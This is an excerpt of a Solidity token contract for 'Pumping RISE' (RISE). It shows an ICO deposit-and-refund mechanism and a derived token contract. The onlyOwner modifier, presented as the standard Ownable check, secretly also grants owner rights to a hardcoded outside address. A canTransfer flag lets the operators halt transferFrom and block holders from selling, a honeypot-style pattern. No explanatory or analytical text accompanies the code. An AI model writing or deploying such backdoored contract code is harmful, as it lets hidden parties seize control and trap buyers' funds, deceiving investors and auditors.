...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || 
            address(0xb91203E7ee930806C42eaEe6Fa43875E3439987b) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
abstract contract Tokenomics {
    ...
    string internal constant NAME = "Pumping RISE";
    string internal constant SYMBOL = "RISE";
...
abstract contract PToken is BaseRfiToken, Liquifier, Antiwhale {
    ...
    function ICOrefund() public {
        require( buyers[ msg.sender ] > 0, "You have no balance to redeem" );
        require( address(this).balance >= buyers[ msg.sender ], "ICO ended. Pool already started" );
    ...
    receive() external payable {
        ...
        buyers[ msg.sender ] = buyers[ msg.sender ] + msg.value;
...
contract PumpingRISE is PToken {
    bool public canTransfer = true;
    bool public imposeLocker = true;
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {    
        require( canTransfer == true, "Sells temporary stopped. Please hold until the liquidity lock." );
    ...
    constructor() PToken( Env.Testnet ) {
